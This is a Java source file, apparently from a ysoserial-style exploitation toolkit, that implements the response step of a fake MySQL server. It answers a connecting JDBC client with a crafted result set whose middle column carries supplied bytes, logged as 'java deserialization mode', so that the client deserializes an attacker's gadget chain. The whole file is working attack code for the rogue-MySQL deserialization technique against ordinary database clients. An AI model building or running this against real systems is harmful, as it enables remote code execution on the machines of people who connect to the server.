package cn.butler.yso.utils.mysql.proto;

import cn.butler.yso.utils.mysql.proto.constant.Resp;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.codec.binary.Hex;

import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

@Slf4j
public class GadgetResolver implements Resolver {
    private final OutputStream outputStream;
    private final byte[] mysqlData;

    public GadgetResolver(OutputStream outputStream, byte[] mysqlData) {
        this.outputStream = outputStream;
        this.mysqlData = mysqlData;
    }

    public void resolve() {
        log.info("Using java deserialization mode");

        try {
            byte[] first = PacketHelper.buildPacket(5, new byte[]{(byte) 0x03});
            outputStream.write(Objects.requireNonNull(first));
            outputStream.flush();

            List<Byte> columns = new ArrayList<>();
            columns.addAll(ColumnPacket.bytesToList(
                    Objects.requireNonNull(PacketHelper.buildPacket(2,
                            ColumnPacket.buildColumnPacket("a")))));
            columns.addAll(ColumnPacket.bytesToList(
                    Objects.requireNonNull(PacketHelper.buildPacket(3,
                            ColumnPacket.buildColumnPacket("b")))));
            columns.addAll(ColumnPacket.bytesToList(
                    Objects.requireNonNull(PacketHelper.buildPacket(4,
                            ColumnPacket.buildColumnPacket("c")))));
            outputStream.write(ColumnPacket.listToBytes(columns));
            outputStream.flush();

            outputStream.write(Objects.requireNonNull(
                    PacketHelper.buildPacket(6, Resp.EOF)));
            outputStream.flush();


            byte[] packet = PacketHelper.buildPacket(6,
                    ColumnPacket.buildColumnValuesPacket(
                            new byte[][]{"111".getBytes(), mysqlData, "222".getBytes()}
                    ));

            log.info("Response hex core data: {}", Hex.encodeHexString(packet));

            outputStream.write(Objects.requireNonNull(packet));
            outputStream.flush();

            outputStream.write(Objects.requireNonNull(
                    PacketHelper.buildPacket(7, Resp.EOF)));
            outputStream.flush();
            log.info("[Fake MySQL] end");
        } catch (Exception ex) {
            log.error("Gadget resolver error: {}", ex.toString());
        }
    }
}
